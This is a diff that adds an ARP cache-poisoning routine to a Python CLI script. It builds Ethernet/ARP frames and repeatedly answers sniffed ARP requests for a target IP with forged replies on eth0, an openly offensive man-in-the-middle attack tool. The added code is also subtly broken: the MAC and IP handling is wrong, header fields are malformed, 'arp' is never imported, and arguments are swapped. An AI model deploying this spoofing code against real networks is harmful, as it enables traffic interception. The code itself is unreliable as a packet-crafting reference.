@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 
 import argparse, sys, socket
+from pcap import sniff, sendpacket
+from struct import unpack
 
 
 def check_ipv4(ip):
@@ -9,6 +11,62 @@ def check_ipv4(ip):
         return True
     except OSError:
         return False
+
+
+def create_arp_request(src_ip, src_mac, target_ip, target_mac):
+    ether_header = b'\xff\xff\xff\xff\xff\xff'
+    ether_header += src_mac.encode()
+    ether_type = 0x0806
+    ether_header += ether_type.to_bytes(2, byteorder='big')
+
+    arp_header = b'\x00\x01'
+    arp_header += b'\x00\x02'
+    arp_header += b'\x00\x00\x00\x00\x00\x00'
+    arp_header += b'\x00\x00\x00\x00\x00\x00'
+    arp_header += b'\x00\x00\x00\x00'
+    arp_header += src_mac.encode() * 6
+    arp_header += src_ip.to_bytes(4, byteorder='big')
+    arp_header += target_mac.encode() * 6
+    arp_header += target_ip.to_bytes(4, byteorder='big')
+
+    arp_request = ether_header + arp_header
+
+    return arp_request
+
+
+def create_arp_reply(src_ip, src_mac, target_mac, target_ip):
+    ether_header = b'\x00\x00\x00\x00\x00\x00'
+    ether_header += src_mac.encode()
+    ether_type = 0x0806
+    ether_header += ether_type.to_bytes(2, byteorder='big')
+
+    arp_header = b'\x00\x02'
+    arp_header += b'\x00\x04'
+    arp_header += b'\x06\x00\x00\x00\x00\x00'
+    arp_header += b'\x04\x00\x00\x00\x00\x00'
+    arp_header += b'\x00\x00\x00\x00'
+    arp_header += src_mac.encode() * 6
+    arp_header += src_ip.to_bytes(4, byteorder='big')
+    arp_header += target_mac.encode() * 6
+    arp_header += target_ip.to_bytes(4, byteorder='big')
+
+    arp_reply = ether_header + arp_header
+
+    return arp_reply
+
+
+def poison_arp(interface, src_ip, src_mac, target_ip, target_mac):
+    arp_request = create_arp_request(src_ip, src_mac, target_ip, target_mac)
+    arp_reply = create_arp_reply(src_ip, src_mac, target_ip, target_mac)
+
+    while True:
+        packet = sniff(interface=interface, count=1)
+        if packet:
+            if packet.haslayer(arp.ARP) and packet[arp.ARP].op == arp.REQUEST:
+                if packet[arp.ARP].psrc == target_ip:
+                    sendpacket(packet, arp_reply)
+                elif packet[arp.ARP].pdst == target_ip:
+                    sendpacket(packet, arp_reply)
 
 
 def parse_arguments():
@@ -26,6 +84,8 @@ def main():
     if not check_ipv4(args.IP_src) or not check_ipv4(args.IP_target):
         print("IP addresses must be IPv4 addresses")
         sys.exit(1)
+
+    poison_arp('eth0', args.IP_src, args.MAC_src, args.IP_target, args.MAC_target)
 
 
 if __name__ == "__main__":
